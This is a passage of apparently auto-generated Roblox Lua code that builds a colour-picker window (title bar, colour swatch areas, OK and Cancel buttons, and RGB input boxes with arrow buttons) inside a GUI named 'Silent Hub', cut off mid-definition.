G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["6e"]["Size"] = UDim2.new(1, 0, 0, 25);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6e"]["Name"] = [[TopBar]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.TopBar.Close
G2L["6f"] = Instance.new("TextButton", G2L["6e"]);
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextSize"] = 14;
G2L["6f"]["AutoButtonColor"] = false;
G2L["6f"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6f"]["BackgroundTransparency"] = 1;
G2L["6f"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6f"]["Text"] = [[X]];
G2L["6f"]["Name"] = [[Close]];
G2L["6f"]["Position"] = UDim2.new(1, -27, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.TopBar.WindowTitle
G2L["70"] = Instance.new("TextLabel", G2L["6e"]);
G2L["70"]["TextSize"] = 14;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["70"]["BackgroundTransparency"] = 1;
G2L["70"]["Size"] = UDim2.new(1, -50, 0, 25);
G2L["70"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["70"]["Text"] = [[Color Picker]];
G2L["70"]["Name"] = [[WindowTitle]];
G2L["70"]["Position"] = UDim2.new(0, 25, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content
G2L["71"] = Instance.new("Frame", G2L["6d"]);
G2L["71"]["Active"] = true;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["71"]["Size"] = UDim2.new(1, -2, 1, -25);
G2L["71"]["Position"] = UDim2.new(0, 1, 0, 25);
G2L["71"]["BorderColor3"] = Color3.fromRGB(38, 54, 55);
G2L["71"]["Name"] = [[Content]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.CustomColors
G2L["72"] = Instance.new("Frame", G2L["71"]);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["Size"] = UDim2.new(0, 180, 0, 90);
G2L["72"]["Position"] = UDim2.new(0, 5, 0, 210);
G2L["72"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["72"]["Name"] = [[CustomColors]];
G2L["72"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.CustomColors.Title
G2L["73"] = Instance.new("TextLabel", G2L["72"]);
G2L["73"]["TextSize"] = 14;
G2L["73"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["73"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["73"]["BackgroundTransparency"] = 1;
G2L["73"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["73"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["73"]["Text"] = [[Custom Colors (RC = Set)]];
G2L["73"]["Name"] = [[Title]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.BasicColors
G2L["74"] = Instance.new("Frame", G2L["71"]);
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Size"] = UDim2.new(0, 180, 0, 200);
G2L["74"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["74"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["74"]["Name"] = [[BasicColors]];
G2L["74"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.BasicColors.Title
G2L["75"] = Instance.new("TextLabel", G2L["74"]);
G2L["75"]["TextSize"] = 14;
G2L["75"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["75"]["BackgroundTransparency"] = 1;
G2L["75"]["Size"] = UDim2.new(1, 0, 0, 26);
G2L["75"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["75"]["Text"] = [[Basic Colors]];
G2L["75"]["Name"] = [[Title]];
G2L["75"]["Position"] = UDim2.new(0, 0, 0, -5);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Cancel
G2L["76"] = Instance.new("TextButton", G2L["71"]);
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 14;
G2L["76"]["AutoButtonColor"] = false;
G2L["76"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0, 100, 0, 25);
G2L["76"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["76"]["Text"] = [[Cancel]];
G2L["76"]["Name"] = [[Cancel]];
G2L["76"]["Position"] = UDim2.new(1, -105, 1, -28);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Ok
G2L["77"] = Instance.new("TextButton", G2L["71"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextSize"] = 14;
G2L["77"]["AutoButtonColor"] = false;
G2L["77"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["77"]["Size"] = UDim2.new(0, 100, 0, 25);
G2L["77"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["77"]["Text"] = [[OK]];
G2L["77"]["Name"] = [[Ok]];
G2L["77"]["Position"] = UDim2.new(1, -210, 1, -28);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue
G2L["78"] = Instance.new("Frame", G2L["71"]);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["78"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["78"]["Position"] = UDim2.new(1, -63, 0, 255);
G2L["78"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["78"]["Name"] = [[Blue]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Title
G2L["79"] = Instance.new("TextLabel", G2L["78"]);
G2L["79"]["TextSize"] = 14;
G2L["79"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["79"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["79"]["BackgroundTransparency"] = 1;
G2L["79"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["79"]["Text"] = [[Blue:]];
G2L["79"]["Name"] = [[Title]];
G2L["79"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input
G2L["7a"] = Instance.new("TextBox", G2L["78"]);
G2L["7a"]["Name"] = [[Input]];
G2L["7a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7a"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["7a"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["7a"]["Text"] = [[0]];
G2L["7a"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame
G2L["7b"] = Instance.new("Frame", G2L["7a"]);
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["7b"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7b"]["Name"] = [[ArrowFrame]];
G2L["7b"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down
G2L["7c"] = Instance.new("TextButton", G2L["7b"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["TextSize"] = 14;
G2L["7c"]["AutoButtonColor"] = false;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["BackgroundTransparency"] = 1;
G2L["7c"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7c"]["Text"] = [[]];
G2L["7c"]["Name"] = [[Down]];
G2L["7c"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow
G2L["7d"] = Instance.new("Frame", G2L["7c"]);
G2L["7d"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7d"]["Name"] = [[Arrow]];
G2L["7d"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["7e"] = Instance.new("Frame", G2L["7d"]);
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7e"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["7e"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["7f"] = Instance.new("Frame", G2L["7d"]);
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7f"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["7f"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Down.Arrow.Frame
G2L["80"] = Instance.new("Frame", G2L["7d"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["80"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["80"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["80"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up
G2L["81"] = Instance.new("TextButton", G2L["7b"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["TextSize"] = 14;
G2L["81"]["AutoButtonColor"] = false;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["81"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["81"]["Text"] = [[]];
G2L["81"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow
G2L["82"] = Instance.new("Frame", G2L["81"]);
G2L["82"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["82"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["82"]["Name"] = [[Arrow]];
G2L["82"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["83"] = Instance.new("Frame", G2L["82"]);
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["83"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["83"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["83"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["84"] = Instance.new("Frame", G2L["82"]);
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["84"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["84"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["84"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Blue.Input.ArrowFrame.Up.Arrow.Frame
G2L["85"] = Instance.new("Frame", G2L["82"]);
G2L["85"]["BorderSizePixel"] = 0;
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["85"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["85"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["85"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red
G2L["86"] = Instance.new("Frame", G2L["71"]);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["86"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["86"]["Position"] = UDim2.new(1, -63, 0, 211);
G2L["86"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["86"]["Name"] = [[Red]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Title
G2L["87"] = Instance.new("TextLabel", G2L["86"]);
G2L["87"]["TextSize"] = 14;
G2L["87"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["87"]["BackgroundTransparency"] = 1;
G2L["87"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["87"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["87"]["Text"] = [[Red:]];
G2L["87"]["Name"] = [[Title]];
G2L["87"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input
G2L["88"] = Instance.new("TextBox", G2L["86"]);
G2L["88"]["Name"] = [[Input]];
G2L["88"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["88"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["88"]["TextSize"] = 14;
G2L["88"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["88"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["88"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["88"]["Text"] = [[0]];
G2L["88"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame
G2L["89"] = Instance.new("Frame", G2L["88"]);
G2L["89"]["BorderSizePixel"] = 0;
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["89"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["89"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["89"]["Name"] = [[ArrowFrame]];
G2L["89"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down
G2L["8a"] = Instance.new("TextButton", G2L["89"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextSize"] = 14;
G2L["8a"]["AutoButtonColor"] = false;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["BackgroundTransparency"] = 1;
G2L["8a"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8a"]["Text"] = [[]];
G2L["8a"]["Name"] = [[Down]];
G2L["8a"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow
G2L["8b"] = Instance.new("Frame", G2L["8a"]);
G2L["8b"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8b"]["Name"] = [[Arrow]];
G2L["8b"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["8c"] = Instance.new("Frame", G2L["8b"]);
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8c"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["8c"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["8d"] = Instance.new("Frame", G2L["8b"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8d"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["8d"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Down.Arrow.Frame
G2L["8e"] = Instance.new("Frame", G2L["8b"]);
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8e"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["8e"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up
G2L["8f"] = Instance.new("TextButton", G2L["89"]);
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["TextSize"] = 14;
G2L["8f"]["AutoButtonColor"] = false;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8f"]["BackgroundTransparency"] = 1;
G2L["8f"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8f"]["Text"] = [[]];
G2L["8f"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow
G2L["90"] = Instance.new("Frame", G2L["8f"]);
G2L["90"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["90"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["90"]["Name"] = [[Arrow]];
G2L["90"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["91"] = Instance.new("Frame", G2L["90"]);
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["91"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["91"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["91"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["92"] = Instance.new("Frame", G2L["90"]);
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["92"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["92"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["92"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Red.Input.ArrowFrame.Up.Arrow.Frame
G2L["93"] = Instance.new("Frame", G2L["90"]);
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["93"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["93"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["93"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green
G2L["94"] = Instance.new("Frame", G2L["71"]);
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["94"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["94"]["Position"] = UDim2.new(1, -63, 0, 233);
G2L["94"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["94"]["Name"] = [[Green]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Title
G2L["95"] = Instance.new("TextLabel", G2L["94"]);
G2L["95"]["TextSize"] = 14;
G2L["95"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["95"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["95"]["BackgroundTransparency"] = 1;
G2L["95"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["95"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["95"]["Text"] = [[Green:]];
G2L["95"]["Name"] = [[Title]];
G2L["95"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input
G2L["96"] = Instance.new("TextBox", G2L["94"]);
G2L["96"]["Name"] = [[Input]];
G2L["96"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["96"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["96"]["TextSize"] = 14;
G2L["96"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["96"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["96"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["96"]["Text"] = [[0]];
G2L["96"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame
G2L["97"] = Instance.new("Frame", G2L["96"]);
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["97"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["97"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["97"]["Name"] = [[ArrowFrame]];
G2L["97"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down
G2L["98"] = Instance.new("TextButton", G2L["97"]);
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["TextSize"] = 14;
G2L["98"]["AutoButtonColor"] = false;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["98"]["BackgroundTransparency"] = 1;
G2L["98"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["98"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["98"]["Text"] = [[]];
G2L["98"]["Name"] = [[Down]];
G2L["98"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow
G2L["99"] = Instance.new("Frame", G2L["98"]);
G2L["99"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["99"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["99"]["Name"] = [[Arrow]];
G2L["99"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9a"] = Instance.new("Frame", G2L["99"]);
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9a"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["9a"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9b"] = Instance.new("Frame", G2L["99"]);
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9b"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["9b"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down.Arrow.Frame
G2L["9c"] = Instance.new("Frame", G2L["99"]);
G2L["9c"]["BorderSizePixel"] = 0;
G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9c"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["9c"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["9c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up
G2L["9d"] = Instance.new("TextButton", G2L["97"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["TextSize"] = 14;
G2L["9d"]["AutoButtonColor"] = false;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9d"]["BackgroundTransparency"] = 1;
G2L["9d"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["9d"]["Text"] = [[]];
G2L["9d"]["Name"] = [[Up]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow
G2L["9e"] = Instance.new("Frame", G2L["9d"]);
